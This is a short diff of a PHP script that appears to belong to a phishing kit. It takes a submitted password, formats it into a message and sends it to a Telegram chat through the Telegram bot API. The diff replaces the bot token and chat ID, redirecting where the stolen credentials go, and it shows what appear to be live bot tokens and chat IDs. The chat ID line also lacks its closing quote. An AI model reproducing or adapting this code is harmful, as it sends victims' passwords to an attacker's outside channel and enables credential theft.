@@ -19,8 +19,8 @@ $password = trim($_POST['password']);
     $message .= "|----------- Sent via Telegram Bot --------------|\n";
     
     // Telegram bot configuration
-    $botToken = '6492371388:AAGsuMJ9UnyurOD1eK6OS5wg1cG3GIRYDdc'; // Replace with your bot token
-    $chatId = '813937357; // Replace with your chat ID
+    $botToken = '8346414900:AAFlrmjpro-xfls4YglsN9feJpTkL_rlac'; // Replace with your bot token
+    $chatId = '7599379821; // Replace with your chat ID
     
     // Send message via Telegram bot
     $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
